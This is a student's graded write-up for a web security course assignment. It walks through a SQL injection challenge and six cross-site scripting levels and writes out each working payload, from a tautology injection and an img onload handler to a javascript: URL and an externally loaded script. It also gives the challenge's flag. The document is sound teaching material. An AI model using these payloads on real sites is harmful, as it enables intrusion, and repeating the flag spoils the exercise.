Writeup 14 - Web II
=====

Name: Evan McIntire
Section: 0201

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement of honor pledge: Evan McIntire

## Assignment 10 Writeup

### Part 1 (70 Pts)

For this part, I immediately saw the **s**, **q**, and **l** bolded in the prompt, telling me that the assignment would be related to sql injection.

I played around with the site first, to see if there was anything hidden, but that turned up nothing. The only attack vector I found was in the item pages, where they had `/item?id=<NUMBER>`. I figured this is where my attack had to take place.

I messed around with the input I gave; first starting with numbers not listed, before moving on to trying to inject sql.

I hit a few internal server errors, but after referring back to the slides and trying correct syntax, I was able to list all of the items using `' or 1='1`. I think the statement behind the scenes was something like `"SELECT * FROM items WHERE id="' + input + ';"`.

Using this, all the items got listed, and I found the flag `CMSC38R-{y0U-are_the_5ql_n1nja}`.


### Part 2 (30 Pts)

### 1
I figured it would start out easy, and just put in `<script>alert('Hello World')</script>`, which passed the challenge immediately.

### 2
This one was a lot trickier. After some experimenting, it was clear that it would delete `<script>` tags, but leave other html in.

I knew the `<img>` tag had an `onload` method that would run JS when it loads an image. So, I found a placeholder image site, and had the source as an image from there, with an `onload` that would alert.

`<img src="https://placeimg.com/640/480/any" onload="alert('Hello World');" />`

### 3
After playing with it, I could tell that it was loading the image based on the value after the hash, but it wasn't totally clear how it was working. I looked at the source, and saw that it was building an image tag with string concatination.

With this knowledge, I was able to finish the image tag on my own, adding code to be run on load, much like what you do with SQL injection.

`#3.jpg'" onload="alert('Hello world!')"/>`

### 4
I tried this one for a long time, seeing how it reacted to different numbers/values, but I wasn't able to initially make much progress.

After some experimenting, I found that giving the value `'` would make the timer run forever, implying to me that it was hitting some sort of error. I opened by browser console, and found an error: `SyntaxError: '' string literal contains an unescaped line break`.

This told me that the page was doing some sort of string concatination, and I could take a similar approach to the previous example: Have the given code execute correctly, but with my own payload.

I ended with `3'); alert('`, which would start the timer and create an empty alert.

### 5
I initially tried attacking the email address form, but the output of it is never used, so that was a useless attack vector.

The only other attack vector was the url. I figured there was something I could do in the URL, and I found the `?next=confirm`, and figured there was some way I could exploit it.

I struggled for a bit, and couldn't figure anything out. I looked at the hints, which confirmed my suspisions, and the final hint gave me the step I needed (adding `javascript:`).

`signup?next=javascript:alert('Hello World')`

### 6

The only attack vector we have here is the url. Changing it, it is clear that it loads from whatever is given after the hash.

Trying to put a url in there results in an error, so we have to get a bit creative!

I wrote a simple script and put it at https://evanmcintire.com/g.js. All it does it run `alert('Hello World');`

I first tried lopping off the https://, and it would 'load' it, but the console had an error.

I messed around with it some more, and took a look at the source. It was looking for `https?://` at the start, but clearly we need some amount of that string still in there in order for this to work.

Keeping only `http:` gives nothing, but when we include only `//`, we load the script!

`#//evanmcintire.com/g.js`